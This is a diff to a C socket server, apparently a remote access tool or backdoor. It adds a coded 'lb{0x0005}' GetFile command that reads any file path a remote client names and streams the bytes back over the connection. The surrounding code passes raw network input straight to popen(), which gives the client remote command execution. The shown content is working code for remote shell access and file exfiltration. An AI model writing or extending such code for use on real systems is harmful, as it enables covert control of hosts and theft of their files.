@@ -136,6 +136,48 @@ void *handle_client(void *arg)
             return 0;*/
         }
 
+        /**
+         * GetFile - lb{0x0005}
+         */
+        if (strncmp(buff, "lb{0x0005}", 10) == 0)
+        {
+            char *token = strtok(buff, " ");
+            char *file_path = strtok(NULL, " ");
+
+            if (file_path == NULL)
+            {
+                strcpy(response, "Error: Missing file path\n");
+                write(connfd, response, strlen(response));
+                continue;
+            }
+
+            FILE *fp = fopen(file_path, "rb");
+            if (fp == NULL)
+            {
+                snprintf(response, sizeof(response), "Failed to open file: %s\n", file_path);
+                write(connfd, response, strlen(response));
+            }
+            else
+            {
+                snprintf(response, sizeof(response), "START_FILE_TRANSFER %s\n", file_path);
+                write(connfd, response, strlen(response));
+
+                char file_buffer[1024];
+                size_t bytes_read;
+                while ((bytes_read = fread(file_buffer, 1, sizeof(file_buffer), fp)) > 0)
+                {
+                    write(connfd, file_buffer, bytes_read);
+                }
+
+                fclose(fp);
+
+                strcpy(response, "END_FILE_TRANSFER\n");
+                write(connfd, response, strlen(response));
+            }
+
+            return 0;
+        }
+
         FILE *process = popen(buff, "r");
         fgets(response, sizeof(response), process);
         printf("\n%s", response);
